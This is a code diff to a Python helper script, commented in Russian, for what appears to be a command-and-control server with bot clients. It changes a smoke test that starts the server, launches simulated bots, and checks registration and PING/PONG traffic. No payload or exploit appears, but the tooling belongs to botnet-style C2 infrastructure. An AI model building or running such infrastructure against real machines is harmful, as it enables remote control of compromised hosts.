@@ -152,7 +152,7 @@ def cmd_genpsk(args) -> int:
     print(f"  C2_PSK={psk} ./client <c2_ip> {args.c2_port}")
     print()
     log("Fake bots:", "info")
-    print(f"  python3 fake_bots.py <c2_ip> {args.c2_port} --psk {psk} --count 3")
+    print(f"  python3 test.py <c2_ip> {args.c2_port} --psk {psk} --count 3")
     return 0
 
 
@@ -223,7 +223,7 @@ def cmd_ports(args) -> int:
 
 # ---------- smoke ----------
 def cmd_smoke(args) -> int:
-    """Запускает сервер + test, проверяет HELLO, CMD, stop."""
+    """Запускает сервер + test.py, проверяет HELLO, CMD, stop."""
     psk = args.psk or os.urandom(32).hex()
     if not _is_valid_psk(psk):
         log("invalid PSK", "err")
@@ -249,7 +249,7 @@ def cmd_smoke(args) -> int:
     )
     fakes = None
     try:
-        # ждём, пока сервер откроет порты
+        # 1. Ждём, пока сервер откроет порты
         deadline = time.time() + 5.0
         ready = False
         while time.time() < deadline:
@@ -262,36 +262,39 @@ def cmd_smoke(args) -> int:
             return 1
         log(f"server up: c2={args.c2} ui={args.ui}", "ok")
 
+        # 2. Запускаем ботов (используем test.py вместо fake_bots.py)
         fakes_log_f = open(fakes_log, "w")
         fakes = subprocess.Popen(
-            [sys.executable, str(ROOT / "fake_bots.py"), "127.0.0.1", str(args.c2),
+            [sys.executable, str(ROOT / "test.py"), "127.0.0.1", str(args.c2),
              "--psk", psk, "--count", str(args.bots), "--interval", "0.1",
              "--no-reconnect"],
             cwd=str(tmpdir), env=env,
             stdout=fakes_log_f, stderr=subprocess.STDOUT,
         )
 
-        # ждём HELLO в логе сервера
-        deadline = time.time() + 10.0
+        # 3. Ждём HELLO в логе сервера (до 15 секунд)
+        deadline = time.time() + 15.0
         hello_count = 0
         while time.time() < deadline:
             if server_log.exists():
                 txt = server_log.read_text(errors="replace")
-                hello_count = txt.count("[new]") + txt.count("[reconnect]")
+                hello_count = txt.count("Бот ")
                 if hello_count >= args.bots:
                     break
             time.sleep(0.2)
+
         if hello_count < args.bots:
             log(f"only {hello_count}/{args.bots} bots registered", "err")
+            # Выводим логи ботов, чтобы понять, почему они не подключились
+            if fakes_log.exists():
+                log("--- fakes.log ---", "warn")
+                print(fakes_log.read_text(errors="replace"))
+                log("-----------------", "warn")
             return 1
+            
         log(f"{hello_count} bots registered", "ok")
 
-        # проверяем, что бот виден через list (эвристика: лог содержит "Бот")
-        txt = server_log.read_text(errors="replace")
-        if "Бот " not in txt:
-            log("no 'Бот' lines in server log", "warn")
-
-        # ждём PING/PONG
+        # 4. Проверяем PING/PONG
         time.sleep(2.0)
         txt = server_log.read_text(errors="replace")
         if "PONG" not in txt and "PING" not in txt:
